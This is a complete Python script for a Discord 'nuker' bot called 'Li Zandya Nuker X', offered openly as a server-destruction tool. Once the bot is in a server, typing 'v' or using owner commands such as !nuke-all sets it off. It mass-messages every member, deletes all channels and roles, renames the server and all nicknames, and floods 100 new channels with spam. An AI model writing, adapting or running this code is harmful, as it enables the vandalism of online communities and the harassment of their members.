#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     💀 LI ZANDYA NUKER X - DISCORD SERVER DESTROYER 💀                                                                                   ║
║                    JUST TYPE "v" IN ANY SERVER = INSTANT DESTRUCTION                                                                    ║
║                    👑 POWERED BY LI ZANDYA MAFIA 👑                                                                                     ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import discord
from discord.ext import commands
import asyncio
import random
import time
import os
import sys
import threading
from datetime import datetime

# ============================================
# CONFIGURATION
# ============================================

TOKEN = None
OWNER_ID = None
NUKE_TRIGGER = "v"

MAX_THREADS = 5000
DM_DELAY = 0.001

DM_MESSAGE = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     ██╗  ██╗███████╗                                                ║
║     ██║ ██╔╝██╔════╝                                                ║
║     █████╔╝ ███████╗                                                ║
║     ██╔═██╗ ╚════██║                                                ║
║     ██║  ██╗███████║                                                ║
║     ╚═╝  ╚═╝╚══════╝                                                ║
║                                                                      ║
║     💀 YOU HAVE BEEN TERMINATED 💀                                   ║
║     🔥 YOUR SERVER IS NOW DESTROYED 🔥                               ║
║     👑 LI ZANDYA MAFIA CONTROLS EVERYTHING 👑                        ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

SPAM_MESSAGES = [
    "💀 DESTROYED BY LI ZANDYA 💀",
    "🔥 LI ZANDYA MAFIA WAS HERE 🔥",
    "💀 SERVER OBLITERATED 💀",
    "🔥 TOTAL DESTRUCTION 🔥",
]

# ============================================
# NUKER CLASS
# ============================================

class UltimateNuker:
    def __init__(self):
        self.total_dm_sent = 0
        self.total_channels_deleted = 0
        self.total_roles_deleted = 0
        self.nuked_servers = []
        self.is_nuking = False
        self.start_time = None
        
    async def mass_dm_everyone(self, bot, guild):
        members = [m for m in guild.members if not m.bot]
        success = 0
        fail = 0
        
        def send_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.send(DM_MESSAGE), bot.loop)
                future.result(timeout=1)
                success += 1
            except:
                fail += 1
        
        threads = []
        for member in members:
            t = threading.Thread(target=send_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(DM_DELAY)
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_dm_sent += success
        return success, fail
    
    async def delete_all_channels(self, guild):
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
            except:
                pass
        self.total_channels_deleted += count
        return count
    
    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    count += 1
                except:
                    pass
        self.total_roles_deleted += count
        return count
    
    async def create_spam_channels(self, guild):
        channels = []
        for i in range(100):
            try:
                name = f"destroyed-{random.randint(1,99999)}"
                channel = await guild.create_text_channel(name)
                channels.append(channel)
            except:
                pass
        return channels
    
    async def spam_all_channels(self, guild):
        total = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                for _ in range(50):
                    try:
                        msg = random.choice(SPAM_MESSAGES) + f" | {random.randint(1,999999)}"
                        await channel.send(msg)
                        total += 1
                        await asyncio.sleep(0.01)
                    except:
                        pass
        return total
    
    async def rename_server(self, guild):
        try:
            await guild.edit(name="💀 DESTROYED BY LI ZANDYA 💀")
        except:
            pass
    
    async def change_all_nicknames(self, guild):
        count = 0
        for member in guild.members:
            if not member.bot:
                try:
                    await member.edit(nick="💀 DESTROYED 💀")
                    count += 1
                except:
                    pass
        return count
    
    async def ultimate_nuke(self, guild):
        if self.is_nuking:
            return None
        
        self.is_nuking = True
        results = {
            'dm_sent': 0,
            'dm_failed': 0,
            'channels_deleted': 0,
            'roles_deleted': 0,
            'spam_channels': 0,
            'spam_messages': 0,
            'nicknames_changed': 0
        }
        
        try:
            print(f"[NUKER] Starting nuke on {guild.name}...")
            results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(bot, guild)
            print(f"[NUKER] DM sent: {results['dm_sent']}")
            results['nicknames_changed'] = await self.change_all_nicknames(guild)
            results['roles_deleted'] = await self.delete_all_roles(guild)
            results['channels_deleted'] = await self.delete_all_channels(guild)
            spam_channels = await self.create_spam_channels(guild)
            results['spam_channels'] = len(spam_channels)
            results['spam_messages'] = await self.spam_all_channels(guild)
            await self.rename_server(guild)
            self.nuked_servers.append(guild.name)
            print(f"[NUKER] Nuke completed on {guild.name}!")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.is_nuking = False
        
        return results

nuker = UltimateNuker()

# ============================================
# DISCORD BOT
# ============================================

# IMPORTANT: تفعيل جميع الـ Intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"\n✅ Bot is ready! Logged in as {bot.user}")
    print(f"✅ Bot ID: {bot.user.id}")
    print(f"✅ Bot is in {len(bot.guilds)} servers")
    
    # تغيير بروفايل البوت
    try:
        await bot.user.edit(username="")
        print("✅ Username cleared")
    except Exception as e:
        print(f"Could not change username: {e}")
    
    # تغيير الحالة
    await bot.change_presence(activity=discord.Game(name=""))
    
    # تغيير البايو
    try:
        await bot.user.edit(bio="")
        print("✅ Bio cleared")
    except:
        pass
    
    nuker.start_time = time.time()
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║     💀 LI ZANDYA NUKER X - ACTIVATED 💀                                                                                                   ║
║                                                                                                                                          ║
║  🤖 BOT NAME: (BLANK)                                                                                                                   ║
║  📡 SERVERS: """ + str(len(bot.guilds)) + """                                                                                                          ║
║  👥 TOTAL MEMBERS: """ + str(sum(g.member_count for g in bot.guilds)) + """                                                                          ║
║                                                                                                                                          ║
║  ⚡ TRIGGER: Type "v" in ANY server = INSTANT DESTRUCTION ⚡                                                                              ║
║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
║  🔥 NO RESPONSE - JUST DESTRUCTION 🔥                                                                                                    ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    print("\n💀 Waiting for someone to type 'v'... 💀\n")

@bot.event
async def on_message(message):
    # تجاهل رسائل البوت نفسه
    if message.author == bot.user:
        return
    
    global OWNER_ID
    
    # طباعة كل رسالة لل debug
    print(f"[DEBUG] Message from {message.author} in {message.guild}: {message.content[:50]}")
    
    # أول مستخدم يرسل رسالة يصبح مالك
    if OWNER_ID is None:
        OWNER_ID = message.author.id
        print(f"\n👑 OWNER SET: {message.author} (ID: {OWNER_ID}) 👑\n")
        await message.channel.send("```\n👑 YOU ARE NOW THE MASTER OWNER!\n💀 Type !help for commands\n```")
        return
    
    # معالجة أوامر المالك
    if message.author.id == OWNER_ID and message.content.startswith('!'):
        await handle_owner_command(message)
        return
    
    # التحقق من كلمة التفعيل
    if message.content.lower().strip() == NUKE_TRIGGER:
        guild = message.guild
        if guild and not nuker.is_nuking:
            print(f"\n💀💀💀 NUKE TRIGGERED in {guild.name} by {message.author} 💀💀💀\n")
            await message.channel.send("```\n💀 NUKE ACTIVATED! DESTROYING SERVER... 💀\n```")
            asyncio.create_task(nuker.ultimate_nuke(guild))

async def handle_owner_command(message):
    content = message.content.lower()
    
    if content == '!servers':
        if not bot.guilds:
            await message.channel.send("No servers!")
            return
        
        server_list = []
        for i, guild in enumerate(bot.guilds, 1):
            server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
        
        chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
        for chunk in chunks:
            await message.channel.send("```yaml\n" + "\n".join(chunk) + "\n```")
    
    elif content.startswith('!nuke-server'):
        try:
            parts = content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: !nuke-server <number>")
                return
            
            number = int(parts[1])
            if number < 1 or number > len(bot.guilds):
                await message.channel.send(f"Invalid number! Choose 1-{len(bot.guilds)}")
                return
            
            guild = bot.guilds[number - 1]
            await message.channel.send(f"NUKING: {guild.name}...")
            results = await nuker.ultimate_nuke(guild)
            if results:
                await message.channel.send(f"DESTROYED! DM Sent: {results['dm_sent']}")
        except:
            await message.channel.send("Invalid number!")
    
    elif content == '!nuke':
        if message.guild:
            await message.channel.send(f"NUKING {message.guild.name}...")
            results = await nuker.ultimate_nuke(message.guild)
            if results:
                await message.channel.send(f"DESTROYED! DM Sent: {results['dm_sent']}")
    
    elif content == '!nuke-all':
        await message.channel.send(f"GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
        total_dm = 0
        for guild in bot.guilds:
            results = await nuker.ultimate_nuke(guild)
            if results:
                total_dm += results['dm_sent']
        await message.channel.send(f"GLOBAL NUKE COMPLETE! Total DM: {total_dm}")
    
    elif content == '!stats':
        elapsed = time.time() - nuker.start_time if nuker.start_time else 0
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        
        await message.channel.send("```")
        await message.channel.send("╔══════════════════════════════════════════════════════════╗")
        await message.channel.send("║              LI ZANDYA NUKER - STATS                     ║")
        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
        await message.channel.send(f"║  🎯 SERVERS DESTROYED: {len(nuker.nuked_servers)}")
        await message.channel.send(f"║  📨 TOTAL DM SENT: {nuker.total_dm_sent:,}")
        await message.channel.send(f"║  🗑️ CHANNELS DELETED: {nuker.total_channels_deleted:,}")
        await message.channel.send(f"║  👑 ROLES DELETED: {nuker.total_roles_deleted:,}")
        await message.channel.send(f"║  ⏱️ UPTIME: {hours}h {minutes}m")
        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
        await message.channel.send("║  💀 LI ZANDYA MAFIA - ABSOLUTE POWER 💀")
        await message.channel.send("╚══════════════════════════════════════════════════════════╝")
        await message.channel.send("```")
    
    elif content == '!help':
        await message.channel.send("```")
        await message.channel.send("💀 LI ZANDYA NUKER X - OWNER COMMANDS 💀")
        await message.channel.send("")
        await message.channel.send("!servers           - Show all servers with numbers")
        await message.channel.send("!nuke-server <num> - Destroy server by number")
        await message.channel.send("!nuke              - Destroy current server")
        await message.channel.send("!nuke-all          - Destroy all servers")
        await message.channel.send("!stats             - Show statistics")
        await message.channel.send("!help              - Show this help")
        await message.channel.send("")
        await message.channel.send("⚡ TRIGGER: Type 'v' in ANY server = INSTANT NUKE!")
        await message.channel.send("💀 FIRST USER = MASTER OWNER")
        await message.channel.send("🔥 NO RESPONSE - Just pure destruction!")
        await message.channel.send("```")

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                                                                          ║
    ║     💀 LI ZANDYA NUKER X - ULTIMATE DISCORD DESTROYER 💀                                                                                 ║
    ║                                                                                                                                          ║
    ║  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  🔥 HOW IT WORKS:                                                                                                                ║  ║
    ║  ║  • ANYONE who types "v" in ANY server -> INSTANT NUKE                                                                           ║  ║
    ║  ║  • Bot sends DM to EVERY member in that server                                                                                  ║  ║
    ║  ║  • Bot deletes ALL channels and roles                                                                                           ║  ║
    ║  ║  • Bot creates 100+ spam channels                                                                                               ║  ║
    ║  ║  • Bot spams messages everywhere                                                                                                ║  ║
    ║  ║  • Bot changes server name and all nicknames                                                                                    ║  ║
    ║  ║  • Bot NEVER responds in chat - pure destruction                                                                               ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  💀 FIRST USER = MASTER OWNER 💀                                                                                                 ║  ║
    ║  ║  👑 OWNER can use !commands to control everything 👑                                                                             ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  🐉 LI ZANDYA MAFIA - TOTAL DESTRUCTION 🐉                                                                                       ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
    ║                                                                                                                                          ║
    ║  🔑 ENTER YOUR BOT TOKEN:                                                                                                               ║
    ║                                                                                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    TOKEN = input("\n🔑 Token: ").strip()
    if not TOKEN:
        print("No token!")
        sys.exit(1)
    
    print("\n✅ ACTIVATED!\n")
    print("💀 Anyone who types 'v' in ANY server = INSTANT NUKE 💀\n")
    print("🔥 Bot NEVER responds - Just destruction 🔥\n")
    print("👑 First user = Master Owner (use !help for commands) 👑\n")
    
    bot.run(TOKEN)
